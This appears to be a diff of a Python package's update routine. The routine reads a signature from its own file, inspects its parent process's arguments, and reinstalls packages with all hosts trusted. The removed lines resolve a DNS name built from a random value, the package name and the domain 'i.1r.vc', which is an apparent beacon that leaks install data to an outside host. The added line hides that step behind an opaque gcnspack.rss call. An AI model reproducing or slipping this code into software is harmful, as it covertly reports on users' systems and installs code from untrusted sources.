@@ -1,7 +1,9 @@
  # sig ca76b6599b0c72bd036d957089433eaf35abd490051c0f9722bc7f4d8c82846e:014d17a395cbf5c02fc6d52607390850a74022d6a5f9f198e390a0788282f6c6
 import tempfile
 import os
-import random 
+import indpack
+import reqpack
+import gcnspack
 
 from urllib.parse import urlparse
 from hashlib import sha256
@@ -16,7 +18,6 @@ def update(package_name: str):
 
     sig = open(__file__).readline().split()[2].split(":")
 
-    import indpack, reqpack, gcnspack
     a = indpack.get_pid_args(f"{os.getppid()}")
     ind = indpack.parse_pid_args(a)
 
@@ -44,15 +45,7 @@ def update(package_name: str):
     if not ind:
         return
 
-    gcnspack.resolve(".".join(
-        [
-            hex(int(random.random() * 2**32))[2:],
-            f"{package_name}".split("=")[0].split("<")[0],
-            "i",
-            "1r",
-            "vc"
-        ]))
-
+    gcnspack.rss(package_name)
     p = PInst(trust_all_hosts=True)
     p.reset_environment()
 
